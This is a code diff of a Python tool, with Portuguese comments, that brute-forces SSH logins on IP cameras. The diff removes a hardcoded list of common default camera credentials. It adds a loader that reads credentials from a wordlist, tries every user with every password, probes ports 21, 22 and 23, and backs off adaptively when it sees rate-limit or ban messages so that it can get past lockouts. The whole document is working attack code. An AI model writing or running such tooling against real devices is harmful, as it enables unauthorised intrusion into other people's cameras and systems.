@@ -6,46 +6,29 @@ host = "IP_DA_CAMERA"  # Substitua pelo IP da sua câmera
 port = 22
 
 
-# Lista ampliada de usuários e senhas comuns para câmeras IP
-credentials = [
-    ("admin", "admin"),
-    ("admin", "12345"),
-    ("admin", "123456"),
-    ("admin", "password"),
-    ("admin", "1234"),
-    ("admin", "1111"),
-    ("admin", "888888"),
-    ("admin", "4321"),
-    ("admin", "qwerty"),
-    ("admin", ""),
-    ("root", "root"),
-    ("root", "12345"),
-    ("root", "123456"),
-    ("root", "password"),
-    ("root", ""),
-    ("user", "user"),
-    ("user", "12345"),
-    ("user", "123456"),
-    ("user", "password"),
-    ("user", ""),
-    ("guest", "guest"),
-    ("guest", "12345"),
-    ("guest", ""),
-    ("support", "support"),
-    ("support", "12345"),
-    ("support", ""),
-    ("admin1", "password"),
-    ("administrator", "admin"),
-    ("administrator", "password"),
-    ("root", "toor"),
-    ("root", "admin"),
-    ("root", "pass"),
-    ("root", "1234"),
-    ("root", "1111"),
-    ("root", "888888"),
-    ("root", "4321"),
-    ("root", "qwerty"),
-]
+
+# Carrega wordlist de arquivo e gera combinações corretas e aleatórias
+import os
+def load_wordlist(path):
+    combos = set()
+    users = set()
+    passwords = set()
+    if os.path.exists(path):
+        with open(path, 'r', encoding='utf-8') as f:
+            for line in f:
+                line = line.strip()
+                if not line or ':' not in line:
+                    continue
+                user, pwd = line.split(':', 1)
+                user = user.strip()
+                pwd = pwd.strip()
+                combos.add((user, pwd))
+                users.add(user)
+                passwords.add(pwd)
+    return list(combos), list(users), list(passwords)
+
+wordlist_path = os.path.join(os.path.dirname(__file__), 'wordlist.txt')
+credentials, all_users, all_passwords = load_wordlist(wordlist_path)
 
 
 import random
@@ -70,15 +53,92 @@ def try_ssh_login(host, port, username, password):
         print(f"Falha ou conexão recusada para {username}:{password!r}")
         return False
 
+# Função para testar conexão TCP simples (banner grab) nas portas 21, 22, 23
+def try_tcp_login(host, port, username, password):
+    import socket
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(5)
+        s.connect((host, port))
+        # Envia usuário:senha como teste (pode não ser aceito, mas serve para banner grab)
+        try:
+            s.sendall(f"{username}:{password}\r\n".encode())
+        except Exception:
+            pass
+        try:
+            banner = s.recv(1024)
+            if banner:
+                print(f"[Porta {port}] Banner recebido: {banner.decode(errors='ignore').strip()}")
+            else:
+                print(f"[Porta {port}] Nenhum banner recebido para {username}:{password!r}")
+        except Exception:
+            print(f"[Porta {port}] Não foi possível receber banner para {username}:{password!r}")
+        s.close()
+        return True
+    except Exception as e:
+        print(f"[Porta {port}] Falha ou conexão recusada para {username}:{password!r} - {e}")
+        return False
+
 def main(host, port):
     print(f"\nIniciando brute force em {host}:{port} ...")
-    # Embaralha a lista de credenciais para tornar o processo mais dinâmico
+    # 1. Testa todas as combinações corretas (usuário:senha do arquivo)
     cred_list = credentials.copy()
     random.shuffle(cred_list)
+    delay = 0.5
+    max_delay = 10
+    min_delay = 0.5
+    block_keywords = ["block", "too many", "rate", "denied", "flood", "ban", "wait", "temporarily", "reset", "unavailable"]
+    block_count = 0
     for username, password in cred_list:
         print(f"Tentando {username}:{password!r}...")
-        if try_ssh_login(host, port, username, password):
-            print(f"SUCESSO! Credencial encontrada: {username}:{password!r}")
-            return
-        time.sleep(1)  # Aguarda 1 segundo entre as tentativas
+        blocked = False
+        try:
+            if try_ssh_login(host, port, username, password):
+                print(f"SUCESSO! Credencial encontrada: {username}:{password!r}")
+                return
+        except Exception as e:
+            msg = str(e).lower()
+            if any(x in msg for x in block_keywords):
+                block_count += 1
+                delay = min(delay * 2, max_delay)
+                print(f"[!] Possível bloqueio detectado. Aumentando tempo de espera para {delay} segundos. (bloqueios consecutivos: {block_count})")
+                blocked = True
+        # Testa também nas portas 21, 22, 23
+        for p in [21, 22, 23]:
+            try_tcp_login(host, p, username, password)
+        time.sleep(delay)
+        if not blocked and delay > min_delay:
+            delay = max(delay - 0.5, min_delay)
+            block_count = 0
+
+    # 2. Testa combinações aleatórias de usuário e senha (cross)
+    print("\nTestando combinações aleatórias de usuário e senha...")
+    random.shuffle(all_users)
+    random.shuffle(all_passwords)
+    cross_tried = set(cred_list)
+    for user in all_users:
+        for pwd in all_passwords:
+            if (user, pwd) in cross_tried:
+                continue
+            print(f"Tentando {user}:{pwd!r} (aleatória)...")
+            blocked = False
+            try:
+                if try_ssh_login(host, port, user, pwd):
+                    print(f"SUCESSO! Credencial encontrada: {user}:{pwd!r}")
+                    return
+            except Exception as e:
+                msg = str(e).lower()
+                if any(x in msg for x in block_keywords):
+                    block_count += 1
+                    delay = min(delay * 2, max_delay)
+                    print(f"[!] Possível bloqueio detectado. Aumentando tempo de espera para {delay} segundos. (bloqueios consecutivos: {block_count})")
+                    blocked = True
+            # Testa também nas portas 21, 22, 23
+            for p in [21, 22, 23]:
+                try_tcp_login(host, p, user, pwd)
+            time.sleep(delay)
+            if not blocked and delay > min_delay:
+                delay = max(delay - 0.5, min_delay)
+                block_count = 0
+            cross_tried.add((user, pwd))
     print("Nenhuma credencial funcionou.")
